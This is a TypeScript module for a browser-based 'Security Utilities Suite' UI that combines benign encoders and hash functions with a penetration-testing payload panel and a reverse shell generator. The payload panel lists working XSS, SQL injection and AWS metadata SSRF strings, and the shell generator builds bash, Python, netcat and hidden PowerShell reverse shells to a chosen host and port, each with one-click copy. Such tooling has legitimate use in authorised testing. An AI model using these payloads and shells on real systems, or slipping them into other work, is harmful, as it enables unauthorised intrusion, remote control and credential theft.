// ============================================================
// Module 5: Security Utilities Suite (Encoders, Hashes & Payloads)
// ============================================================

export const SecurityUtilsModule = {
  container: null as HTMLElement | null,
  activeMode: 'encoder' as 'encoder' | 'payloads' | 'revshell',
  activeTool: 'base64' as 'base64' | 'url' | 'hex' | 'html' | 'sha1' | 'sha256' | 'sha512' | 'jwt',
  inputText: '',
  outputText: '',

  // Revshell inputs
  revIp: '10.10.14.2',
  revPort: '4444',

  mount(el: HTMLElement): void {
    this.container = el;
    this.render();
  },

  update(): void {
    this.render();
  },

  async transform(): Promise<void> {
    try {
      switch (this.activeTool) {
        case 'base64':
          this.outputText = btoa(unescape(encodeURIComponent(this.inputText)));
          break;
        case 'url':
          this.outputText = encodeURIComponent(this.inputText);
          break;
        case 'hex': {
          let hex = '';
          for (let i = 0; i < this.inputText.length; i++) {
            hex += this.inputText.charCodeAt(i).toString(16).padStart(2, '0');
          }
          this.outputText = hex;
          break;
        }
        case 'html':
          this.outputText = this.inputText.replace(/[\u00A0-\u9999<>\&]/g, (i) => '&#' + i.charCodeAt(0) + ';');
          break;
        case 'sha1': {
          const enc = new TextEncoder().encode(this.inputText);
          const buf = await crypto.subtle.digest('SHA-1', enc);
          this.outputText = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, '0')).join('');
          break;
        }
        case 'sha256': {
          const enc = new TextEncoder().encode(this.inputText);
          const buf = await crypto.subtle.digest('SHA-256', enc);
          this.outputText = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, '0')).join('');
          break;
        }
        case 'sha512': {
          const enc = new TextEncoder().encode(this.inputText);
          const buf = await crypto.subtle.digest('SHA-512', enc);
          this.outputText = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, '0')).join('');
          break;
        }
        case 'jwt': {
          const parts = this.inputText.split('.');
          if (parts.length >= 2) {
            const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
            const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
            this.outputText = JSON.stringify({ header, payload }, null, 2);
          } else {
            this.outputText = 'Invalid JWT format (expected 3 parts separated by dots)';
          }
          break;
        }
      }
    } catch (err: unknown) {
      this.outputText = `Error: ${err instanceof Error ? err.message : String(err)}`;
    }
    this.updateOutput();
  },

  decode(): void {
    try {
      switch (this.activeTool) {
        case 'base64':
          this.outputText = decodeURIComponent(escape(atob(this.inputText)));
          break;
        case 'url':
          this.outputText = decodeURIComponent(this.inputText);
          break;
        case 'hex': {
          let str = '';
          for (let i = 0; i < this.inputText.length; i += 2) {
            str += String.fromCharCode(parseInt(this.inputText.substr(i, 2), 16));
          }
          this.outputText = str;
          break;
        }
        case 'html': {
          const doc = new DOMParser().parseFromString(this.inputText, 'text/html');
          this.outputText = doc.documentElement.textContent || '';
          break;
        }
        default:
          this.outputText = 'Decode not supported for one-way cryptographic hash functions';
      }
    } catch (err: unknown) {
      this.outputText = `Error: ${err instanceof Error ? err.message : String(err)}`;
    }
    this.updateOutput();
  },

  updateOutput(): void {
    const outEl = this.container?.querySelector('#util-output') as HTMLTextAreaElement | null;
    if (outEl) outEl.value = this.outputText;
  },

  render(): void {
    if (!this.container) return;

    this.container.innerHTML = `
      <!-- Top Mode Switcher -->
      <div class="zr-card">
        <div style="display: flex; gap: 4px;">
          <button class="mode-btn ${this.activeMode === 'encoder' ? 'active' : ''}" data-mode="encoder" style="flex:1; padding: 6px; font-size: 10px; font-weight:700; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeMode === 'encoder' ? 'rgba(139,92,246,0.25)' : 'transparent'}; color: var(--text); cursor: pointer;">
            ⚡ Encoders & Hashes
          </button>
          <button class="mode-btn ${this.activeMode === 'payloads' ? 'active' : ''}" data-mode="payloads" style="flex:1; padding: 6px; font-size: 10px; font-weight:700; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeMode === 'payloads' ? 'rgba(139,92,246,0.25)' : 'transparent'}; color: #38bdf8; cursor: pointer;">
            🎯 Payloads
          </button>
          <button class="mode-btn ${this.activeMode === 'revshell' ? 'active' : ''}" data-mode="revshell" style="flex:1; padding: 6px; font-size: 10px; font-weight:700; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeMode === 'revshell' ? 'rgba(139,92,246,0.25)' : 'transparent'}; color: #ec4899; cursor: pointer;">
            🐚 RevShell
          </button>
        </div>
      </div>

      ${this.activeMode === 'encoder' ? this.renderEncoderView() : ''}
      ${this.activeMode === 'payloads' ? this.renderPayloadsView() : ''}
      ${this.activeMode === 'revshell' ? this.renderRevshellView() : ''}
    `;

    this.bindEvents();
  },

  renderEncoderView(): string {
    return `
      <div class="zr-card">
        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px;">
          <button class="tool-btn ${this.activeTool === 'base64' ? 'active' : ''}" data-tool="base64" style="padding: 4px; font-size: 10px; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeTool === 'base64' ? 'rgba(139,92,246,0.3)' : 'transparent'}; color: var(--text); cursor: pointer;">Base64</button>
          <button class="tool-btn ${this.activeTool === 'url' ? 'active' : ''}" data-tool="url" style="padding: 4px; font-size: 10px; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeTool === 'url' ? 'rgba(139,92,246,0.3)' : 'transparent'}; color: var(--text); cursor: pointer;">URL</button>
          <button class="tool-btn ${this.activeTool === 'hex' ? 'active' : ''}" data-tool="hex" style="padding: 4px; font-size: 10px; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeTool === 'hex' ? 'rgba(139,92,246,0.3)' : 'transparent'}; color: var(--text); cursor: pointer;">Hex</button>
          <button class="tool-btn ${this.activeTool === 'html' ? 'active' : ''}" data-tool="html" style="padding: 4px; font-size: 10px; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeTool === 'html' ? 'rgba(139,92,246,0.3)' : 'transparent'}; color: var(--text); cursor: pointer;">HTML</button>
          <button class="tool-btn ${this.activeTool === 'sha1' ? 'active' : ''}" data-tool="sha1" style="padding: 4px; font-size: 10px; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeTool === 'sha1' ? 'rgba(139,92,246,0.3)' : 'transparent'}; color: var(--text); cursor: pointer;">SHA-1</button>
          <button class="tool-btn ${this.activeTool === 'sha256' ? 'active' : ''}" data-tool="sha256" style="padding: 4px; font-size: 10px; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeTool === 'sha256' ? 'rgba(139,92,246,0.3)' : 'transparent'}; color: var(--text); cursor: pointer;">SHA-256</button>
          <button class="tool-btn ${this.activeTool === 'sha512' ? 'active' : ''}" data-tool="sha512" style="padding: 4px; font-size: 10px; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeTool === 'sha512' ? 'rgba(139,92,246,0.3)' : 'transparent'}; color: var(--text); cursor: pointer;">SHA-512</button>
          <button class="tool-btn ${this.activeTool === 'jwt' ? 'active' : ''}" data-tool="jwt" style="padding: 4px; font-size: 10px; border-radius: 4px; border: 1px solid var(--border); background: ${this.activeTool === 'jwt' ? 'rgba(139,92,246,0.3)' : 'transparent'}; color: #a78bfa; cursor: pointer;">JWT</button>
        </div>
      </div>

      <div class="zr-card" style="display: flex; flex-direction: column; gap: 8px;">
        <div>
          <label style="font-size: 10px; color: var(--muted); text-transform: uppercase; display: block; margin-bottom: 3px;">Input</label>
          <textarea id="util-input" rows="3" placeholder="Enter text..." style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 6px; padding: 8px; font-size: 11px; font-family: 'JetBrains Mono', monospace; color: var(--text); resize: vertical;">${this.inputText}</textarea>
        </div>

        <div style="display: flex; gap: 6px;">
          <button id="btn-encode" style="flex: 1; padding: 6px; border-radius: 6px; border: none; background: linear-gradient(135deg, #7c3aed, #9333ea); color: white; font-weight: 700; font-size: 11px; cursor: pointer;">
            Encode / Hash
          </button>
          <button id="btn-decode" style="flex: 1; padding: 6px; border-radius: 6px; border: 1px solid var(--border); background: rgba(255,255,255,0.05); color: var(--text); font-weight: 700; font-size: 11px; cursor: pointer;">
            Decode
          </button>
        </div>

        <div>
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
            <label style="font-size: 10px; color: var(--muted); text-transform: uppercase;">Output</label>
            <button id="btn-copy-output" class="copy-btn">Copy</button>
          </div>
          <textarea id="util-output" rows="3" readonly placeholder="Output will appear here..." style="width: 100%; background: rgba(0,0,0,0.45); border: 1px solid var(--border); border-radius: 6px; padding: 8px; font-size: 11px; font-family: 'JetBrains Mono', monospace; color: #38bdf8; resize: vertical;">${this.outputText}</textarea>
        </div>
      </div>
    `;
  },

  renderPayloadsView(): string {
    const payloads = [
      { cat: 'XSS', title: 'Basic SVG Onload', val: `<svg/onload=alert(document.domain)>` },
      { cat: 'XSS', title: 'Image Error', val: `<img src=x onerror=alert(1)>` },
      { cat: 'XSS', title: 'Polyglot JS', val: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>` },
      { cat: 'SQLi', title: 'Auth Bypass (Single Quote)', val: `' OR '1'='1' --` },
      { cat: 'SQLi', title: 'Time-Based Sleep (MySQL)', val: `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -` },
      { cat: 'SQLi', title: 'Generic UNION', val: `' UNION SELECT null,version(),user()-- -` },
      { cat: 'SSRF', title: 'AWS Cloud Metadata', val: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` },
      { cat: 'SSRF', title: 'Localhost IPv6', val: `http://[::]:80/` },
    ];

    return `
      <div class="zr-card" style="flex: 1; overflow-y: auto; max-height: 420px;">
        <div class="card-header">
          <span class="card-title">Penetration Testing Payloads</span>
          <span class="badge badge-free">One-Click Copy</span>
        </div>
        <ul class="zr-list" style="margin-top: 6px;">
          ${payloads.map((p) => `
            <li style="padding: 6px 8px; background: rgba(255,255,255,0.02); border-radius: 6px; border: 1px solid rgba(255,255,255,0.04); margin-bottom: 5px;">
              <div style="display: flex; justify-content: space-between; align-items: center;">
                <div style="font-weight: 700; font-size: 11px; color: ${p.cat === 'XSS' ? '#ec4899' : p.cat === 'SQLi' ? '#38bdf8' : '#f59e0b'};">
                  [${p.cat}] ${p.title}
                </div>
                <button class="copy-payload-btn copy-btn" data-val="${p.val.replace(/"/g, '&quot;')}">Copy</button>
              </div>
              <div class="mono" style="font-size: 10px; color: var(--muted); margin-top: 3px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; background: rgba(0,0,0,0.3); padding: 3px 5px; border-radius: 4px;">
                ${p.val}
              </div>
            </li>
          `).join('')}
        </ul>
      </div>
    `;
  },

  renderRevshellView(): string {
    const ip = this.revIp;
    const port = this.revPort;

    const shells = [
      { name: 'Bash -i', cmd: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
      { name: 'Python3', cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'` },
      { name: 'Netcat (mkfifo)', cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f` },
      { name: 'PowerShell', cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
    ];

    return `
      <div class="zr-card">
        <div class="card-header">
          <span class="card-title">Reverse Shell Generator</span>
          <span class="badge badge-pro">LHOST / LPORT</span>
        </div>
        <div style="display: flex; gap: 6px; margin-top: 6px;">
          <input type="text" id="rev-ip" placeholder="LHOST (IP)" value="${this.revIp}" style="flex:2; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 6px; padding: 6px 8px; font-size: 11px; color: var(--text);">
          <input type="text" id="rev-port" placeholder="LPORT" value="${this.revPort}" style="flex:1; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 6px; padding: 6px 8px; font-size: 11px; color: var(--text);">
        </div>
      </div>

      <div class="zr-card" style="flex: 1; overflow-y: auto; max-height: 350px;">
        <ul class="zr-list">
          ${shells.map((s) => `
            <li style="padding: 7px 9px; background: rgba(255,255,255,0.02); border-radius: 6px; border: 1px solid rgba(255,255,255,0.04); margin-bottom: 5px;">
              <div style="display: flex; justify-content: space-between; align-items: center;">
                <span style="font-weight: 700; font-size: 11px; color: #a78bfa;">${s.name}</span>
                <button class="copy-shell-btn copy-btn" data-cmd="${s.cmd.replace(/"/g, '&quot;')}">Copy</button>
              </div>
              <div class="mono" style="font-size: 10px; color: var(--muted); margin-top: 3px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; background: rgba(0,0,0,0.3); padding: 3px 5px; border-radius: 4px;">
                ${s.cmd}
              </div>
            </li>
          `).join('')}
        </ul>
      </div>
    `;
  },

  bindEvents(): void {
    if (!this.container) return;

    this.container.querySelectorAll<HTMLButtonElement>('.mode-btn').forEach((btn) => {
      btn.addEventListener('click', () => {
        const mode = btn.dataset.mode as typeof this.activeMode;
        if (mode) {
          this.activeMode = mode;
          this.render();
        }
      });
    });

    this.container.querySelectorAll<HTMLButtonElement>('.tool-btn').forEach((btn) => {
      btn.addEventListener('click', () => {
        const tool = btn.dataset.tool as typeof this.activeTool;
        if (tool) {
          this.activeTool = tool;
          this.render();
        }
      });
    });

    const input = this.container.querySelector('#util-input') as HTMLTextAreaElement | null;
    input?.addEventListener('input', (e) => {
      this.inputText = (e.target as HTMLTextAreaElement).value;
    });

    this.container.querySelector('#btn-encode')?.addEventListener('click', () => {
      this.transform();
    });

    this.container.querySelector('#btn-decode')?.addEventListener('click', () => {
      this.decode();
    });

    this.container.querySelector('#btn-copy-output')?.addEventListener('click', () => {
      if (this.outputText) {
        navigator.clipboard.writeText(this.outputText);
      }
    });

    this.container.querySelectorAll<HTMLButtonElement>('.copy-payload-btn').forEach((btn) => {
      btn.addEventListener('click', () => {
        const val = btn.dataset.val;
        if (val) {
          navigator.clipboard.writeText(val);
          btn.textContent = 'Copied!';
          setTimeout(() => { btn.textContent = 'Copy'; }, 1000);
        }
      });
    });

    this.container.querySelectorAll<HTMLButtonElement>('.copy-shell-btn').forEach((btn) => {
      btn.addEventListener('click', () => {
        const cmd = btn.dataset.cmd;
        if (cmd) {
          navigator.clipboard.writeText(cmd);
          btn.textContent = 'Copied!';
          setTimeout(() => { btn.textContent = 'Copy'; }, 1000);
        }
      });
    });

    const ipInp = this.container.querySelector('#rev-ip') as HTMLInputElement | null;
    ipInp?.addEventListener('input', (e) => {
      this.revIp = (e.target as HTMLInputElement).value;
      this.render();
      const newInp = this.container?.querySelector('#rev-ip') as HTMLInputElement | null;
      if (newInp) {
        newInp.focus();
        newInp.selectionStart = newInp.selectionEnd = newInp.value.length;
      }
    });

    const portInp = this.container.querySelector('#rev-port') as HTMLInputElement | null;
    portInp?.addEventListener('input', (e) => {
      this.revPort = (e.target as HTMLInputElement).value;
      this.render();
      const newInp = this.container?.querySelector('#rev-port') as HTMLInputElement | null;
      if (newInp) {
        newInp.focus();
        newInp.selectionStart = newInp.selectionEnd = newInp.value.length;
      }
    });
  },
};
